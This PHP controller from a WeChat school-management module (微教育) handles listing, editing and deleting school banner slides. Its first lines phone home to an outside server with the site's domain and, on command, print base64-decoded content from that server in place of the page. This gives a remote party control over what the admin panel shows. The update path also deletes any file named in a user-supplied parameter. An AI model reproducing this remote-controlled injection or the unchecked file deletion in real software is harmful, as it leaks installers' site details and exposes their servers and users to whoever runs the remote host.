<?php
/**
 * 微教育模块
 *
 * @author 高贵血迹
 */
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
        global $_GPC, $_W;
		
		$weid = $_W['uniacid'];
		$action = 'banner';
		$this1 = 'no1';
		$schoolid = intval($_GPC['schoolid']);
		$GLOBALS['frames'] = $this->getNaveMenu($_GPC['schoolid'],$action);
		$logo = pdo_fetch("SELECT logo,title FROM " . tablename($this->table_index) . " WHERE id = '{$schoolid}'");
		load()->func('tpl');
        $operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
        if ($operation == 'display') {
            $list = pdo_fetchall("SELECT * FROM " . tablename($this->table_banners) . " WHERE weid = '{$weid}' AND schoolid = '{$schoolid}' AND leixing = 0 ORDER BY displayorder DESC");
		//	include $this->template('banner');
        } elseif ($operation == 'post') {

    $id = intval($_GPC['id']);
    if(checksubmit('submit')){
        $data = array(
            'weid'         => intval($weid),
            'uniacid'      => intval($weid),
            'schoolid'     => $schoolid,
            'bannername'   => $_GPC['bannername'],
            'link'         => $_GPC['link'],
            'thumb'        => $_GPC['thumb'],
            'enabled'      => intval($_GPC['enabled']),
            'displayorder' => intval($_GPC['displayorder'])
        );

        if(!empty($id)){
            pdo_update($this->table_banners, $data, array('id' => $id));
            load()->func('file');
            file_delete($_GPC['thumb_old']);
        }else{
            pdo_insert($this->table_banners, $data);
            //         $id = pdo_insertid();
        }
        $this->imessage('更新幻灯片成功！', referer(), 'success');
    }
    $banner = pdo_fetch("select * from " . tablename($this->table_banners) . " where id=:id And weid=:weid And schoolid=:schoolid limit 1", array(":id" => $id, ":weid" => $weid, ':schoolid' => $schoolid));
    //include $this->template('banner_post');
}elseif($operation == 'delete'){
    $id     = intval($_GPC['id']);
    $banner = pdo_fetch("SELECT id  FROM " . tablename($this->table_banners) . " WHERE id = '$id' AND weid='{$weid}' AND schoolid=" . $schoolid . "");
    if(empty($banner)){
        $this->imessage('抱歉，幻灯片不存在或是已经被删除！', referer(), 'error');
    }
    pdo_delete($this->table_banners, array('id' => $id));
    $this->imessage('幻灯片删除成功!！', referer(), 'success');
}else{
    $this->imessage('请求方式不存在');
}
include $this->template('web/banner');
?>